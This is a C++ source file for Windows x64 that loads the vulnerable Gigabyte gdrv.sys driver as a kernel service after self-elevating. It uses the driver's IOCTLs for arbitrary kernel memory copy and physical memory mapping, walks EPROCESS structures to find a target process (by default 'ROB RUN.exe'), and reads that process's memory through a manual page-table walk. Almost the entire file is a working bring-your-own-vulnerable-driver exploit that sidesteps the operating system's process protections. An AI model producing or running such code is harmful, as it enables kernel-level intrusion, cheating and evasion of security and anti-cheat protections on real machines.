// C++20, proc_read.cpp, Windows x64 — gdrv process read primitive
// Chain: gdrv kernel memcpy -> PsInitialSystemProcess -> EPROCESS walk ->
//        DirectoryTableBase -> page-table walk -> \Device\PhysicalMemory maps.
// Requires elevation (self-elevates with UAC).

#include <windows.h>
#include <shellapi.h>
#include <psapi.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <algorithm>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

namespace {

constexpr wchar_t kServiceName[] = L"gdrv";
constexpr wchar_t kDevicePath[]  = L"\\\\.\\GIO";

constexpr DWORD kIoctlPhysMap   = 0xC3502004;
constexpr DWORD kIoctlPhysUnmap = 0xC3502008;
constexpr DWORD kIoctlMemcpy    = 0xC3502808;

// ntoskrnl 10.0.19041.6456 (running 19045.6456): PsInitialSystemProcess RVA
constexpr uint64_t kPsInitialSystemProcess = 0xCFC420;

// EPROCESS offsets, Win10 20H1-22H2 x64
constexpr uint64_t kEprocessDirectoryTableBase = 0x28;
constexpr uint64_t kEprocessUniqueProcessId    = 0x440;
constexpr uint64_t kEprocessActiveLinks        = 0x448;
constexpr uint64_t kEprocessSectionBaseAddress = 0x520;
constexpr uint64_t kEprocessPeb                = 0x550;
constexpr uint64_t kEprocessImageFileName      = 0x5A8;

struct IoMemcpy {
    void* dest;
    void* src;
    DWORD size;
    DWORD pad;
};

struct PhysMap {
    uint32_t iface;         // INTERFACE_TYPE (0 = Internal)
    uint32_t bus;           // BusNumber
    uint64_t addr;          // BusAddress (physical)
    uint32_t addressSpace;  // 0 = memory
    uint32_t length;        // bytes
};

struct PhysUnmap {
    uint64_t va;
    uint64_t size;
};

bool is_admin() {
    BOOL admin = FALSE;
    PSID sid = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid)) {
        CheckTokenMembership(nullptr, sid, &admin);
        FreeSid(sid);
    }
    return admin != FALSE;
}

bool enable_privilege(const wchar_t* name) {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueW(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr) != 0;
    }
    CloseHandle(token);
    return ok;
}

void relaunch_elevated() {
    wchar_t exe[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    ShellExecuteW(nullptr, L"runas", exe, nullptr, nullptr, SW_SHOWNORMAL);
}

bool ensure_service(const std::wstring& sys_path) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    SC_HANDLE svc = CreateServiceW(scm, kServiceName, kServiceName,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, sys_path.c_str(), nullptr, nullptr, nullptr,
        nullptr, nullptr);
    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            svc = OpenServiceW(scm, kServiceName, SERVICE_ALL_ACCESS);
    }
    bool ok = false;
    if (svc) {
        if (StartServiceW(svc, 0, nullptr)) ok = true;
        else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) ok = true;
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

HANDLE open_driver() {
    return CreateFileW(kDevicePath, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
}

bool kread(HANDLE dev, void* dst, const void* src, size_t size) {
    auto* d = static_cast<BYTE*>(dst);
    auto* s = static_cast<const BYTE*>(src);
    while (size) {
        DWORD chunk = size > 0x1000 ? 0x1000 : static_cast<DWORD>(size);
        IoMemcpy arg{ d, const_cast<void*>(static_cast<const void*>(s)), chunk, 0 };
        DWORD returned = 0;
        if (!DeviceIoControl(dev, kIoctlMemcpy, &arg, sizeof(arg), nullptr, 0,
                &returned, nullptr))
            return false;
        d += chunk; s += chunk; size -= chunk;
    }
    return true;
}

uint64_t kread64(HANDLE dev, uint64_t addr) {
    uint64_t v = 0;
    kread(dev, &v, reinterpret_cast<const void*>(addr), sizeof(v));
    return v;
}

uint32_t kread32(HANDLE dev, uint64_t addr) {
    uint32_t v = 0;
    kread(dev, &v, reinterpret_cast<const void*>(addr), sizeof(v));
    return v;
}

uint64_t map_phys(HANDLE dev, uint64_t pa, uint32_t size) {
    PhysMap m{ 0, 0, pa, 0, size };
    DWORD returned = 0;
    if (!DeviceIoControl(dev, kIoctlPhysMap, &m, sizeof(m), &m, sizeof(m),
            &returned, nullptr)) {
        static int reported = 0;
        if (reported++ < 3)
            wprintf(L"[!] physmap ioctl failed pa=0x%llx err=%lu\n",
                static_cast<unsigned long long>(pa), GetLastError());
        return 0;
    }
    uint64_t va = 0;
    std::memcpy(&va, &m, sizeof(va));
    if (!va) {
        static int reported = 0;
        if (reported++ < 3)
            wprintf(L"[!] physmap returned null pa=0x%llx ret=%lu iface=%u bus=%u addr=0x%llx size=%u\n",
                static_cast<unsigned long long>(pa), returned, m.iface, m.bus,
                static_cast<unsigned long long>(m.addr), m.length);
    }
    return va;
}

void unmap_phys(HANDLE dev, uint64_t va) {
    PhysUnmap u{ va, 0 };
    DWORD returned = 0;
    DeviceIoControl(dev, kIoctlPhysUnmap, &u, sizeof(u), nullptr, 0,
        &returned, nullptr);
}

bool phys_read(HANDLE dev, uint64_t pa, void* out, size_t size) {
    auto* o = static_cast<uint8_t*>(out);
    while (size) {
        uint64_t page = pa & ~0xFFFull;
        size_t off = static_cast<size_t>(pa & 0xFFF);
        size_t n = std::min<size_t>(size, 0x1000 - off);
        uint64_t va = map_phys(dev, page, 0x1000);
        if (!va) {
            wprintf(L"[!] map_phys failed at 0x%llx\n", static_cast<unsigned long long>(page));
            return false;
        }
        std::memcpy(o, reinterpret_cast<void*>(va + off), n);
        unmap_phys(dev, va);
        o += n; pa += n; size -= n;
    }
    return true;
}

uint64_t va_to_pa(HANDLE dev, uint64_t cr3, uint64_t va) {
    uint64_t pml4e = 0, pdpte = 0, pde = 0, pte = 0;
    uint64_t pml4 = cr3 & ~0xFFFull;
    if (!phys_read(dev, pml4 + 8 * ((va >> 39) & 0x1FF), &pml4e, 8)) return 0;
    if (!(pml4e & 1)) return 0;
    uint64_t pdpt = pml4e & 0x000FFFFFFFFFF000ull;
    if (!phys_read(dev, pdpt + 8 * ((va >> 30) & 0x1FF), &pdpte, 8)) return 0;
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ull) + (va & 0x3FFFFFFFull);
    uint64_t pd = pdpte & 0x000FFFFFFFFFF000ull;
    if (!phys_read(dev, pd + 8 * ((va >> 21) & 0x1FF), &pde, 8)) return 0;
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ull) + (va & 0x1FFFFFull);
    uint64_t pt = pde & 0x000FFFFFFFFFF000ull;
    if (!phys_read(dev, pt + 8 * ((va >> 12) & 0x1FF), &pte, 8)) return 0;
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ull) + (va & 0xFFFull);
}

bool read_process(HANDLE dev, uint64_t cr3, uint64_t va, void* out, size_t size) {
    auto* o = static_cast<uint8_t*>(out);
    while (size) {
        uint64_t pa = va_to_pa(dev, cr3, va);
        if (!pa) return false;
        size_t off = static_cast<size_t>(va & 0xFFF);
        size_t n = std::min<size_t>(size, 0x1000 - off);
        if (!phys_read(dev, pa, o, n)) return false;
        o += n; va += n; size -= n;
    }
    return true;
}

} // namespace

int wmain(int argc, wchar_t** argv) {
    if (!is_admin()) {
        wprintf(L"[*] elevating...\n");
        relaunch_elevated();
        return 0;
    }

    enable_privilege(L"SeDebugPrivilege");
    enable_privilege(L"SeLockMemoryPrivilege");

    wchar_t exe[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    std::wstring dir(exe);
    const auto slash = dir.find_last_of(L"\\/");
    if (slash != std::wstring::npos) dir.resize(slash + 1);
    const std::wstring sys_path = dir + L"gdrv.sys";

    DWORD target_pid = 0;
    if (argc > 1) target_pid = static_cast<DWORD>(_wtoi(argv[1]));
    const wchar_t* target_name = L"ROB RUN.exe";

    wprintf(L"[*] service=%ls driver=%ls pid=%lu\n", kServiceName, sys_path.c_str(), target_pid);
    if (!ensure_service(sys_path)) {
        wprintf(L"[!] service start failed: %lu\n", GetLastError());
        return 1;
    }
    HANDLE dev = open_driver();
    if (dev == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] device open failed: %lu\n", GetLastError());
        return 1;
    }

    LPVOID bases[1024]{};
    DWORD needed = 0;
    if (!EnumDeviceDrivers(bases, sizeof(bases), &needed) || needed == 0) {
        wprintf(L"[!] EnumDeviceDrivers failed\n");
        return 1;
    }
    const uint64_t ntos = reinterpret_cast<uint64_t>(bases[0]);
    wprintf(L"[*] ntos=0x%llx\n", static_cast<unsigned long long>(ntos));

    const uint64_t sys_proc = kread64(dev, ntos + kPsInitialSystemProcess);
    wprintf(L"[*] PsInitialSystemProcess=0x%llx\n", static_cast<unsigned long long>(sys_proc));
    if (!sys_proc) { wprintf(L"[!] null system process\n"); return 1; }

    uint64_t cur = sys_proc;
    uint64_t target_ep = 0;
    for (int i = 0; i < 4096; ++i) {
        const uint32_t pid = kread32(dev, cur + kEprocessUniqueProcessId);
        char name[16]{};
        kread(dev, name, reinterpret_cast<const void*>(cur + kEprocessImageFileName), 15);
        if (target_pid ? (pid == target_pid) : (std::strstr(name, "ROB RUN") != nullptr)) {
            target_ep = cur;
            wprintf(L"[*] found pid=%lu name=%hs ep=0x%llx\n", pid, name,
                static_cast<unsigned long long>(cur));
            break;
        }
        const uint64_t flink = kread64(dev, cur + kEprocessActiveLinks);
        if (!flink) break;
        cur = flink - kEprocessActiveLinks;
        if (cur == sys_proc) break;
    }
    if (!target_ep) { wprintf(L"[!] target not found\n"); return 1; }

    const uint64_t cr3 = kread64(dev, target_ep + kEprocessDirectoryTableBase);
    const uint64_t section_base = kread64(dev, target_ep + kEprocessSectionBaseAddress);
    const uint64_t peb = kread64(dev, target_ep + kEprocessPeb);
    wprintf(L"[*] cr3=0x%llx section_base=0x%llx peb=0x%llx\n",
        static_cast<unsigned long long>(cr3),
        static_cast<unsigned long long>(section_base),
        static_cast<unsigned long long>(peb));

    WORD mz = 0;
    if (read_process(dev, cr3, section_base, &mz, sizeof(mz))) {
        wprintf(L"[*] read @ exe base: 0x%04x (%s)\n", mz, mz == 0x5A4D ? L"MZ OK" : L"unexpected");
    } else {
        wprintf(L"[!] read exe base failed\n");
    }

    CloseHandle(dev);
    wprintf(L"[*] done. service left running (sc stop gdrv && sc delete gdrv)\n");
    return 0;
}
